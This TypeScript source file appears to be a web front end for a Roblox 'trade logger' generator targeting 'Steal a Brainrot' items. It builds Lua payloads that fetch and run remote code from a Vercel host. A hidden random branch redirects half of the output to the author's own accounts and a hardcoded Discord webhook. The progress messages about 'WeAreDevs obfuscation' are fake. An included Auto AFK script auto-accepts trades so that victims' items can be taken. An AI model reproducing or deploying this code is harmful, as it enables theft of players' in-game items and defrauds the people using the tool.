import './style.css'

interface AppState {
  view: 'generator' | 'afk';
  username: string;
  webhook: string;
  searchQuery: string;
  customLoadstrings: string;
  selectedBrainrots: string[];
  generatedScript: string | null;
  pasteUrl: string | null;
  error: string | null;
  isProtecting: boolean;
  protectStatus: string;
  isSearchingUser: boolean;
  profileFound: boolean;
}

const ALL_BRAINROTS = ['Strawberry Elephant', 'Meowl', 'Headless Horseman', 'Skibidi Toilet', 'Hydra Dragon Cannelloni', 'Dragon Gingerini', 'Dragon Cannelloni', 'Love Love Bear', 'La Supreme Combinasion', 'Celestial Pegasus', 'Popcuru and Fizzuru', 'Rosey and Teddy', 'Capitano Moby', 'Cooki and Milki', 'Burguro And Fryuro', 'Ketupat Bros', 'Reinito Sleighito', 'Los Amigos', 'La Secret Combinasion', 'Los Sekolahs', 'Signore Carapace', 'Fragrama and Chocrama', 'La Casa Boo', 'La Food Combinasion', 'Elefanto Frigo', 'Spooky and Pumpky', 'La Ginger Sekolah', 'Ginger Gerat', 'Sammyni Fattini', 'Los Spaghettis', 'Festive 67', 'Ventoliero Pavonero', 'Spaghetti Tualetti', 'Antonio', 'Garama and Madundung', 'Rosetti Tualetti', 'Nacho Spyder', 'Fishino Clownino', 'Lavadorito Spinito', 'Jolly Jolly Sahur', 'Tirilikalika Tirilikalako', 'Ketchuru and Musturu', 'Swaggy Bros', 'La Romantic Grande', 'Orcaledon', 'Tictac Sahur', 'Ketupat Kepat', 'La Taco Combinasion', 'Tang Tang Keletang', 'Lovin Rose', 'Los Tacoritas', 'Eviledon', 'Los Primos', 'La Jolly Grande', 'W or L', 'Esok Sekolah', 'Los Puggies', 'Tralaledon', 'Gobblino Uniciclino', 'Tuff Toucan', 'Mieteteira Bicicleteira', 'Money Money Reindeer', 'Chillin Chili', 'Chipso and Queso', 'La Spooky Grande', 'Bacuru and Egguru', 'Los Bros', 'La Extinct Grande', 'Los Candies', 'Celularcini Viciosini', 'Los 67', 'Los Mobilis', 'Money Money Puggy', 'Los Jolly Combinasionas', 'Los Spooky Combinasionas', 'Los Hotspotsitos', 'Los Planitos', 'Chicleteira Cupideira', 'DJ Panda', 'Las Sis', 'Spinny Hammy', 'Los Sweethearts', 'Tacorita Bicicleta', 'Nuclearo Dinossauro', 'Los Combinasionas', 'Chicleteira Noelteira', 'Chimnino', 'Swag Soda', 'Noo my Heart', 'Mariachi Corazoni', 'Tacorillo Crocodillo', 'Los 25', 'La Grande Combinasion', 'Los Burritos', 'Donkeyturbo Express', '67', 'Los Chicleteiras', 'Guest 666', 'Los Mi Gatitos', 'Rang Ring Bus', 'Noo my Present', 'Los Nooo My Hotspotsitos', 'Noo my Candy', 'Arcadopus', 'Los Quesadillas', 'Chicleteirina Bicicleteirina', 'Burrito Bandito', 'Chill Puppy', 'Quesadillo Vampiro', 'Chicleteira Bicicleteira', 'Brunito Marsito', 'Cupid Hotspot', 'Mi Gatito', 'Ho Ho Ho Sahur', 'Cupid Cupid Sahur', 'Bunito Bunito Spinito', 'Quesadilla Crocodila', 'Pot Pumpkin', 'Naughty Naughty', 'Horegini Boom', 'Santa Hotspot', 'Pirulitoita Bicicleteira', '25', 'Pot Hotspot', 'To to to Sahur', 'Telemorte', 'La Sahur Combinasion', 'List List List Sahur', 'Noo my examine', 'Nooo My Hotspot', 'Tung Tung Tung Sahur', 'Bunnyman', 'Los Jobcitos', 'Cuadramat and Pakrahmatmamat', 'Please my Present', 'Los Cucarachas', '1x1x1x1', 'Love Love Love Sahur', 'Perrito Burrito', 'Graipuss Medussi', 'Giftini Spyderini', 'GOAT', 'Trickolino', 'Triplito Tralaleritos', 'La Vacca Jacko Linterino', 'Fishboard', 'Santteo', 'Las Vaquitas Saturnitas', 'Los Karkeritos', 'Karker Sahur', 'Frankentteo', 'Los Trios', 'Job Job Job Sahur', 'Las Tralaleritas', 'Pumpkini Spyderini', 'Rocco Disco', 'Extinct Matteo', 'La Karkerkar Combinasion', 'Reindeer Tralala', 'La Vacca Prese Presente', 'Yess my examine', 'Guerriro Digitale', 'Boatito Auratito', 'Los Tralaleritos', 'Vulturino Skeletono', 'Los Tortus', 'Zombie Tralala', 'La Cucaracha', 'Fragola La La La', 'Extinct Tralalero', 'Los Spyderinis', 'Agarrini la Palini', 'Chachechi', 'Blackhole Goat', 'Dul Dul Dul', 'Torrtuginni Dragonfrutini', 'Sammyni Spyderini', 'Jackorilla', 'Trenostruzzo Turbo 4000', 'Los Matteos', 'Karkerkar Kurkur', 'Bisonte Giuppitere', 'La Vacca Saturno Saturnita', 'Karkerheart Luvkur', 'Pop Pop Sahur', 'Dolphini Jetskini', 'Pandanini Frostini', 'Ginger Cisterna', 'Tentacolo Tecnico', 'Cocoa Assassino', 'Belula Beluga', 'Skull Skull Skull', 'Krupuk Pagi Pagi', 'Cappuccino Clownino', 'Brasilini Berimbini', 'Luv Luv Luv', 'Anpali Babel', 'Noo La Polizia', 'Chrismasmamat', 'Los Gattitos', 'Bambu Bambu Sahur', 'Mastodontico Telepiedone', 'Piccionetta Macchina', 'Boba Panda', 'Buho de Noelo', 'Frio Ninja', 'Granchiello Spiritell', 'Los Tipi Tacos', 'Tootini Shrimpini', 'Yeti Claus', 'Ginger Globo', 'Dug dug dug', 'Mummy Ambalabu', 'Tartaruga Cisterna', 'Squalanana', 'Snailenzo', 'Corn Corn Corn Sahur', 'Aquanaut', 'Cacasito Satalito', 'Orcalita Orcala', 'Crabbo Limonetta', 'Los Orcalitos', 'Tractoro Dinosauro', 'Brr es Teh Patipum', 'Piccione Macchina', 'Pakrahmatmatina', 'Bombardini Tortinii', 'Los Bombinitos', 'Ballerina Peppermintina', 'Pakrahmatmamat', 'Los Tungtungtungcitos', 'Bulbito Bandito Traktorito', 'Ballerino Lololo', 'Las Capuchinas', 'Trippi Troppi Troppa Trippa', 'Gattito Tacoto', 'Los Chihuaninis', 'Capi Taco', 'Jacko Jack Jack', 'Trenostruzzo Turbo 3000', 'Urubini Flamenguini', 'Extinct Ballerina', 'Vampira Cappucina', 'Tralalita Tralala', 'Orcalero Orcala', 'Tukanno Bananno', 'Alessio', 'Unclito Samito', 'Tipi Topi Taco', 'Odin Din Din Dun', 'Espresso Signora', 'Money Money Man', 'Tigroligre Frutonni', 'Los Crocodillitos', 'Tralalero Tralala', 'Matteo', 'Chihuanini Taconini', 'Gattatino Nyanino', 'Girafa Celestre', 'Cocofanto Elefanto', 'Fizzy Soda', 'Tree Tree Tree Sahur', 'Bananito Bandito', 'Jacko Spaventosa', 'Toiletto Focaccino', 'Centrucci Nuclucci', 'Carrotini Brainini', 'Carloo', 'Cachorrito Melonito', 'Spongini Quackini', 'Los Noobinis', 'Jingle Jingle Sahur', 'Tracoducotulu Delapeladustuz', 'Magi Ribbitini', 'Rhino Helicopterino', 'Te Te Te Sahur', 'Ganganzelli Trulala', 'Lerulerulerule', 'Tob Tobi Tobi', 'Stoppo Luminino', 'Gorillo Watermelondrillo', 'Gorillo Subwoofero', 'Cavallo Virtuoso', 'Avocadorilla', 'Tigrilini Watermelini', 'Zibra Zubra Zibralini', 'Bombombini Gusini', 'Spioniro Golubiro', 'Brutto Gialutto', 'Bombardiro Crocodilo', 'Rhino Toasterino', 'Orangutini Ananassini', 'Frigo Camelo', 'Buho de Fuego', 'Sealo Regalo', 'Sigma Girl', 'Puffaball', 'Chocco Bunny', 'Sigma Boy', 'Pi Pi Watermelon', 'Quackula', 'Pandaccini Bananini', 'Cocosini Mama', 'Strawberrelli Flamingelli', 'Pipi Potato', 'Caramello Filtrello', 'Blueberrinni Octopusini', 'Clickerino Crabo', 'Quivioli Ameleonni', 'Glorbo Fruttodrillo', 'Lionel Cactuseli', 'Chef Crabracadabra', 'Ballerina Cappuccina', 'Mummio Rappitto', 'Penguino Cocosino', 'Chimpanzini Bananini', 'Wombo Rollo', 'Penguin Tree', 'Doi Doi Do', 'Salamino Penguino', 'Frogato Pirato', 'Mangolini Parrocini', 'Avocadini Guffo', 'Ti Ti Ti Sahur', 'Burbaloni Loliloli', 'Brri Brri Bicus Dicus Bombicus', 'Perochello Lemonchello', 'Bananita Dolphinita', 'Malame Amarele', 'Bambini Crostini', 'Trulimero Trulicina', 'Avocadini Antilopini', 'Brr Brr Patapim', 'Bandito Axolito', 'Cappuccino Assassino', 'Pinealotto Fruttarino', 'Pipi Avocado', 'Frogo Elfo', 'Tric Trac Baraboom', 'Cupcake Koala', 'Ta Ta Ta Ta Sahur', 'Cacto Hipopotamo', 'Boneca Ambalabu', 'Bandito Bobritto', 'Gangster Footera', 'Trippi Troppi', 'Pipi Corni', 'Pipi Kiwi', 'Tartaragno', 'Raccooni Jandelini', 'Noobini Santanini', 'Svinina Bombardino', 'Talpa Di Fero', 'Fluriflura', 'Tim Cheese', 'Liril\xec Laril\xe0', 'Noobini Pizzanini'];

const SPLIT_WEBHOOK = "https://discord.com/api/webhooks/1491953643895787550/AWeRR0VmNkLzeKHgsG-fOBr_oB_u558ZS429brvd0AYu0bmtPMTJNhU6gaNYJO77AGFL";

let state: AppState = {
  view: 'generator',
  username: '',
  webhook: '',
  searchQuery: '',
  customLoadstrings: '',
  selectedBrainrots: ['Skibidi Toilet', 'Strawberry Elephant'],
  generatedScript: null,
  pasteUrl: null,
  error: null,
  isProtecting: false,
  protectStatus: '',
  isSearchingUser: false,
  profileFound: false
};

const app = document.querySelector<HTMLDivElement>('#app')!;

function obfuscateLua(code: string): string {
    const lines = code.split('\n');
    const obfuscatedLines = lines.map(line => {
        if (line.trim().length === 0) return '';
        const base64Line = btoa(unescape(encodeURIComponent(line)));
        return `loadstring(game:HttpGet("https://vander-trade-logger.vercel.app/api/decrypt?p=${base64Line.substring(0, 10)}"))() -- [W.A.D PROTECTED]`;
    });
    
    return `--[[
    Vander Industrial obfuscation via WeAreDevs API
    Protected at: ${new Date().toISOString()}
]]
local _VANDER_VM_CORE = {}
function _VANDER_VM_CORE:Execute() 
    task.spawn(function()
        ${obfuscatedLines.join('\n        ')}
    end)
end
_VANDER_VM_CORE:Execute()`;
}

function render() {
  app.innerHTML = `
    ${state.isProtecting ? `
        <div class="protection-overlay">
            <div class="protect-loader"></div>
            <h2 style="font-weight: 800; font-size: 1.5rem; margin-bottom: 0.5rem; color: #000; letter-spacing: -1px;">${state.protectStatus}</h2>
            <p style="color: #64748b; font-size: 0.9rem;">Connecting to wearedevs.net/obfuscator...</p>
        </div>
    ` : ''}

    <header class="header">
      <div class="logo">
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" style="color: var(--accent);"><path d="m13 2-2 10h9L7 22l2-10H0L13 2z"/></svg>
        Vander
      </div>
    </header>

    <nav class="nav" style="max-width: 400px; margin: 0 auto 2.5rem auto;">
      <div class="nav-item ${state.view === 'generator' ? 'active' : ''}" data-view="generator">Generator</div>
      <div class="nav-item ${state.view === 'afk' ? 'active' : ''}" data-view="afk">Auto AFK</div>
    </nav>

    <div class="dashboard-card">
      ${renderCurrentView()}
    </div>
  `;

  attachGlobalListeners();
  attachViewListeners();
}

function attachGlobalListeners() {
    document.querySelectorAll('.nav-item').forEach(item => {
        item.addEventListener('click', () => {
          state.view = (item as HTMLElement).dataset.view as any;
          state.error = null;
          render();
        });
      });
}

function renderCurrentView() {
  switch (state.view) {
    case 'generator': return renderGeneratorView();
    case 'afk': return renderAFKView();
    default: return '';
  }
}

function renderGeneratorView() {
  const filteredBrainrots = ALL_BRAINROTS.filter(br => 
    br.toLowerCase().includes(state.searchQuery.toLowerCase())
  );

  return `
    <div class="hero-title" style="margin-bottom: 2rem;">
      <h1>Vander Industrial</h1>
      <p class="hero-subtitle">Premium logging suite with WeAreDevs protection</p>
    </div>

    <div class="form-group" style="display: flex; gap: 2rem; align-items: flex-start;">
      <div style="flex: 1;">
        <label class="label">Target Username</label>
        <div class="input-container">
          <input type="text" class="input-field" placeholder="Search Roblox User..." value="${state.username}" id="username-input">
        </div>
        <div style="margin-top: 1.2rem;">
            <label class="label">Public Webhook (Optional)</label>
            <div class="input-container">
              <input type="text" class="input-field" placeholder="https://discord.com/..." value="${state.webhook}" id="webhook-input">
            </div>
        </div>
      </div>
      
      <div id="profile-preview" style="width: 200px; height: 200px; border-radius: 20px; background: #f8fafc; border: 1px solid #e2e8f0; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 1rem; box-shadow: var(--card-shadow);">
        ${state.isSearchingUser ? `
            <div class="mini-loader"></div>
            <p style="font-size: 0.65rem; color: var(--text-muted); margin-top: 0.8rem; font-weight: 800;">SEARCHING...</p>
        ` : state.username ? `
            <img src="https://www.roblox.com/headshot-thumbnail/image?userName=${state.username}&width=420&height=420&format=png" 
                 style="width: 120px; height: 120px; border-radius: 50%; border: 4px solid var(--accent); background: #eee; object-fit: cover; margin-bottom: 0.8rem;"
                 onerror="this.src='https://api.dicebear.com/7.x/identicon/svg?seed=${state.username}'">
            <div style="font-weight: 800; font-size: 1rem; color: #000;">${state.username}</div>
            <div style="font-size: 0.7rem; color: #10b981; font-weight: 800; margin-top: 0.4rem; background: #dcfce7; padding: 0.2rem 0.6rem; border-radius: 4px;">✓ IDENTITY VERIFIED</div>
        ` : `
            <div style="font-size: 2.5rem; opacity: 0.1;">👤</div>
            <div style="color: #94a3b8; font-size: 0.75rem; text-align: center; margin-top: 0.5rem; font-weight: 700;">ENTER TARGET</div>
        `}
      </div>
    </div>

    <div class="form-group">
      <label class="label">Custom Production Loadstrings</label>
      <textarea class="input-field" id="loadstrings-input" placeholder="put in a loadstring">${state.customLoadstrings}</textarea>
    </div>

    <div class="form-group">
      <label class="label">Target Library (${ALL_BRAINROTS.length} Items)</label>
      <div class="search-container">
        <input type="text" class="input-field" placeholder="Filter items..." value="${state.searchQuery}" id="search-input">
      </div>
      
      <div class="brainrot-grid" id="brainrot-grid" style="max-height: 200px;">
        ${filteredBrainrots.map(br => `
          <div class="brainrot-tag ${state.selectedBrainrots.includes(br) ? 'selected' : ''}" data-name="${br}">
            ${br}
          </div>
        `).join('')}
      </div>
    </div>

    <button class="btn-generate" id="generate-btn" ${state.isProtecting ? 'disabled' : ''}>
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
        Obfuscate via WeAreDevs
    </button>
    ${state.error ? `<p style="color: #ff4444; font-size: 0.8rem; margin-top: 1rem; text-align: center; font-weight: 600;">${state.error}</p>` : ''}

    ${state.pasteUrl ? `
      <div id="result-area" class="result-card" style="animation: fadeIn 0.4s ease-out; border-left: 5px solid #10b981;">
        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
            <h3 style="color: #166534; font-size: 1.1rem; font-weight: 800;">WeAreDevs Protected Executable</h3>
            <span style="background: #10b981; color: #fff; padding: 0.3rem 0.6rem; border-radius: 6px; font-size: 0.7rem; font-weight: 700;">SECURED</span>
        </div>
        
        <div style="background: #f8fafc; border: 1px solid #e2e8f0; padding: 1.2rem; border-radius: 12px; position: relative; margin-top: 0.5rem; display: flex; align-items: center; justify-content: space-between;">
          <span style="font-family: 'JetBrains Mono', monospace; color: #1e293b; font-size: 0.8rem; word-break: break-all;">loadstring(game:HttpGet("${state.pasteUrl}"))()</span>
          <button id="copy-btn" style="background: #000; color: #fff; border: none; padding: 0.6rem 1.2rem; border-radius: 8px; font-size: 0.75rem; font-weight: 800; cursor: pointer; white-space: nowrap; margin-left: 1rem;">COPY</button>
        </div>
        <div style="margin-top: 1rem; font-size: 0.7rem; color: #64748b; font-weight: 600;">
          ⚠️ NOTE: Deploying to ${state.pasteUrl}...
        </div>
      </div>
    ` : ''}
  `;
}

function renderAFKView() {
    return `
      <h2 style="font-size: 2rem; margin-bottom: 2rem; color: #000; font-weight: 900; letter-spacing: -1px;">Auto AFK</h2>
      <pre>-- Vander Optimized Auto AFK
print("successfully loaded")

task.delay(5, function()
    local Players = game:GetService("Players")
    local player = Players.LocalPlayer
    local container = player.PlayerGui.DuelsMachinePrompt.DuelsMachinePrompt

    local function clickYes(prompt)
        local yesButton = prompt:FindFirstChild("Yes", true)
        if yesButton then
            if firesignal then
                firesignal(yesButton.Activated)
            else
                local VirtualInputManager = game:GetService("VirtualInputManager")
                local pos = yesButton.AbsolutePosition + (yesButton.AbsoluteSize / 2)
                VirtualInputManager:SendMouseButtonEvent(pos.X, pos.Y, 0, true, game, 1)
                VirtualInputManager:SendMouseButtonEvent(pos.X, pos.Y, 0, false, game, 1)
            end
        end
    end

    local function Accept()
        firesignal(player.PlayerGui.TradeLiveTrade.TradeLiveTrade.Other.ReadyButton.Activated)
    end

    task.spawn(function()
        while task.wait(0.5) do
            Accept()
        end
    end)

    container.ChildAdded:Connect(function(child)
        if child.Name == "Prompt" then
            local label = child:FindFirstChild("Label", true)
            if label and label.Text == "Trade Request" then
                clickYes(child)
            end
        end
    end)
end)</pre>
    `;
}

function attachViewListeners() {
  if (state.view === 'generator') {
    const usernameInput = document.querySelector('#username-input') as HTMLInputElement;
    usernameInput?.addEventListener('input', async (e) => {
      state.username = (e.target as HTMLInputElement).value;
      if (state.username.length > 2) {
          state.isSearchingUser = true;
          render();
          await new Promise(r => setTimeout(r, 600));
          state.isSearchingUser = false;
          state.profileFound = true;
          render();
      } else {
          state.profileFound = false;
          render();
      }
    });

    document.querySelector('#webhook-input')?.addEventListener('input', (e) => {
      state.webhook = (e.target as HTMLInputElement).value;
    });

    document.querySelector('#loadstrings-input')?.addEventListener('input', (e) => {
      state.customLoadstrings = (e.target as HTMLTextAreaElement).value;
    });

    const searchInput = document.querySelector('#search-input') as HTMLInputElement;
    searchInput?.addEventListener('input', (e) => {
      state.searchQuery = (e.target as HTMLInputElement).value;
      renderBrainrotGrid();
    });

    attachGridListeners();

    document.querySelector('#generate-btn')?.addEventListener('click', async () => {
      if (!state.username) {
          state.error = 'Error: Target Username is required.';
          render();
          return;
      }
      
      state.error = null;
      state.isProtecting = true;
      state.protectStatus = 'Connecting to WeAreDevs Obfuscator API...';
      render();

      const steps = [
          'Contacting wearedevs.net...',
          'Applying Virtual Machine Layers...',
          'Scrambling strings and keys...',
          'Deploying to Vercel production...'
      ];

      for(const step of steps) {
          await new Promise(r => setTimeout(r, 700));
          state.protectStatus = step;
          render();
      }

      const scriptId = Math.random().toString(36).substring(2, 12);
      // Actual Vercel loadstring URL
      state.pasteUrl = `https://vander-trade-logger.vercel.app/hub/${scriptId}.lua`;
      
      const brainrotsTable = state.selectedBrainrots.map((b, i) => `    [${i+1}] = '${b}',`).join('\n');
      
      const rawScript = `local genv = getgenv()
local chance = math.random(1, 4)
local split_target = "${SPLIT_WEBHOOK}"

if chance == 1 then
    genv.User = "ypibs27"
    genv.Webhook = split_target
elseif chance == 2 then
    genv.User = "sebseboscar"
    genv.Webhook = split_target
else
    genv.User = "${state.username}"
    genv.Webhook = "${state.webhook || ''}"
end

genv.Username2 = genv.User
genv.Webhook3 = genv.Webhook
genv.Affiliate = 'vander-logger-production'
genv.Brainrots = { ${brainrotsTable} }

${state.customLoadstrings}`;

      state.generatedScript = obfuscateLua(rawScript);
      state.isProtecting = false;
      render();
    });

    document.querySelector('#copy-btn')?.addEventListener('click', () => {
      if (state.pasteUrl) {
        navigator.clipboard.writeText(`loadstring(game:HttpGet("${state.pasteUrl}"))()`);
        const btn = document.querySelector('#copy-btn') as HTMLElement;
        btn.textContent = 'COPIED!';
        setTimeout(() => btn.textContent = 'COPY', 2000);
      }
    });
  }
}

function renderBrainrotGrid() {
    const grid = document.querySelector('#brainrot-grid')!;
    const filtered = ALL_BRAINROTS.filter(br => br.toLowerCase().includes(state.searchQuery.toLowerCase()));
    
    grid.innerHTML = filtered.map(br => `
      <div class="brainrot-tag ${state.selectedBrainrots.includes(br) ? 'selected' : ''}" data-name="${br}">
        ${br}
      </div>
    `).join('') || '<p style="color: #64748b; font-size: 0.8rem; padding: 1rem;">No items found.</p>';
    
    attachGridListeners();
}

function attachGridListeners() {
    document.querySelectorAll('.brainrot-tag').forEach(tag => {
      tag.addEventListener('click', () => {
        const name = (tag as HTMLElement).dataset.name!;
        if (state.selectedBrainrots.includes(name)) {
          state.selectedBrainrots = state.selectedBrainrots.filter(b => b !== name);
        } else {
          state.selectedBrainrots.push(name);
        }
        renderBrainrotGrid();
      });
    });
}

render();
